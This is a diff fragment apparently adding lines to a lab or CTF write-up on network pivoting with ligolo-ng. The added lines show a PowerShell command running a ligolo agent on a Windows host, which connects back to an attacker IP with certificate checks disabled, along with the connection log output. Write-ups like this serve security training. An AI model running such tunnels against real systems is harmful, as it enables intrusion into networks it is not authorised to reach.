@@ -294,6 +294,15 @@ ligolo-ng »
 Ill then start the proxy on my machine
 
 ```python
+PS C:\Utils> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+.\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+time="2026-10-22T17:09:26+01:00" level=warning msg="warning, certificate validation disabled"
+time="2026-10-22T17:09:26+01:00" level=info msg="Connection established" addr="10.10.14.61:11601"
+```
+
+Ill trigger the connection
+
+```python
 
 ```
 
